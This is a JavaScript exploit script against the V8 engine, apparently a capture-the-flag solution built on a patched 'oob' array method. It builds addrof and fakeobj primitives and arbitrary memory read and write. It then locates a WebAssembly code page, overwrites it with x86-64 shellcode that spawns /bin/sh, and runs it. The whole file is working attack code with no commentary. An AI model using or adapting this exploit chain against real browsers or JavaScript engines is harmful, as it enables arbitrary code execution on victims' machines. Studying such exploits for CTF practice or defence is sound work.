var buffer = new ArrayBuffer(8);
var u8 = new Uint8Array(buffer);
var u32 = new Uint32Array(buffer);
var f64 = new Float64Array(buffer);
var BASE = 0x100000000;
function i2f(i) {
    u32[0] = i%BASE;
    u32[1] = i/BASE;
    return f64[0];
}
function f2i(f) {
    f64[0] = f;
    return u32[0] + BASE*u32[1];
}
function hex(x) {
    if (x < 0)
        return `-${hex(-x)}`;
    return `0x${x.toString(16)}`;
}

var doubleAry = [1.1, 2.2, 3.3, 4.4];
var doubleArrayMap = f2i(doubleAry.oob());
print("[+] GET Double Array Map: "+hex(doubleArrayMap));

let obj  = {x : 100};
var objectAry = [obj];
var contigousArrayMap = f2i(objectAry.oob());
print("[+] GET Contigous Array Map: "+hex(contigousArrayMap));

function addrof(obj){
    objectAry[0] = obj;
    objectAry.oob(i2f(doubleArrayMap));
    let leak = f2i(objectAry[0]);
    objectAry.oob(i2f(contigousArrayMap));
    return leak;
}

function fakeobj(addr){
    doubleAry[0] = i2f(addr);
    doubleAry.oob(i2f(contigousArrayMap));
    let fake = doubleAry[0];
    doubleAry.oob(i2f(doubleArrayMap));
    return fake;
}

var victim = [
    1, 0xdeadbeef, 
    0xdeadbeef, 0xdeadbeef
];

victim[0] = i2f(doubleArrayMap);
victim[1] = 0;
victim[2] = i2f(addrof(victim)); //test
victim[3] = i2f(0x4*0x100000000);

var controllerAddr = addrof(victim) - 0x20;
var controller = fakeobj(controllerAddr);

function read64(addr){
    victim[2] = i2f(addr-0x10);
    return f2i(controller[0]);
}

function write64(addr, content){
    victim[2] = i2f(addr-0x10);
    controller[0] = i2f(content);
}

let buf = new ArrayBuffer(0x100);

let buf_addr = addrof(buf);
print("[+] GET ArrayBufferObject address: "+hex(buf_addr));

function abt_write64(addr, content){

    //point to targete address
    write64(buf_addr+0x20, addr);
    let buf_f64 = new Float64Array(buf);
    //write content
    buf_f64[0] = i2f(content);

}

function injectShellcode(addr, shellcode){

    write64(buf_addr+0x20, addr);
    let buf_u8 = new Uint8Array(buf);
    for(let i=0, len=shellcode.length; i<len; i++){
        buf_u8[i] = shellcode[i].charCodeAt();
    }

}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);

var shellcodeFunc = wasmInstance.exports.main;

var shellcodeAddr = addrof(shellcodeFunc);
shellcodeAddr = read64(shellcodeAddr+8*3);
shellcodeAddr = read64(shellcodeAddr+8*1);
shellcodeAddr = read64(shellcodeAddr+8*2);
shellcodeAddr = read64(shellcodeAddr+8*0x11);
print("[+] GET Shellcode address: "+hex(shellcodeAddr));

shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05";

injectShellcode(shellcodeAddr, shellcode);

print("[+] Shellcode injected!");

shellcodeFunc();